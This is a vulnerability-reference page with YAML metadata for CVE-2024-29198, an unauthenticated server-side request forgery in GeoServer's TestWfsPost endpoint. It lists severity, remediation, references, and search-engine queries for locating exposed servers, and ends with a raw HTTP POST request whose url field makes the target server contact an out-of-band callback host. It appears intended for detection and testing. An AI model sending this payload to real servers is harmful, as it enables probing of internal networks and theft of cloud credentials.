---
layout: post
cve_id: CVE-2024-29198
title: GeoServer Demo Request Endpoint - Server Side Request Forgery
pcap: true
pcap_path: /pcaps/2024/CVE-2024-29198.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-29198.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,pdresearch
severity: high
impact: 'An attacker can exploit this vulnerability to access internal resources,
  enumerate internal networks, and potentially access sensitive data in cloud environments
  through the server-side request forgery attack.

  '
remediation: 'Upgrade to a patched version of GeoServer or configure the Proxy Base
  URL properly to prevent unauthorized server-side requests through the TestWfsPost
  endpoint.

  '
reference:
- https://github.com/geoserver/geoserver/security/advisories/GHSA-5gw5-jccf-6hxw
- https://osgeo-org.atlassian.net/browse/GEOS-11390
- https://osgeo-org.atlassian.net/browse/GEOS-11794
- https://nvd.nist.gov/vuln/detail/CVE-2024-29198
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2024-29198
  cwe-id: CWE-918
  epss-score: 0.05147
  epss-percentile: 0.89548
metadata:
  verified: true
  max-request: 1
  vendor: osgeo
  product: geoserver
  shodan-query:
  - http.title:"geoserver"
  - server:"geohttpserver"
  fofa-query:
  - app="geoserver"
  - title="geoserver"
  google-query: intitle:"geoserver"
tags:
- cve
- cve2024
- ssrf
- geoserver
- oos
- oast
- vkev
- vuln
---

## üîç Vulnerability Description
It is possible to achieve Server Side Request Forgery (SSRF) via the Demo request endpoint if Proxy Base URL has not been set. An unauthenticated user can supply a request that will be issued by the server, allowing enumeration of internal networks and, in the case of cloud instances, access to sensitive data.


## üåê HTTP Request
```nohighlight
POST /geoserver/TestWfsPost HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 88
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
url=http://d5iq02hle0o2b05jhv3gmrbbskcdps7ni.oast.live/?body=38BKzY6lvWHVyhBb7UFkm2lF9du
```

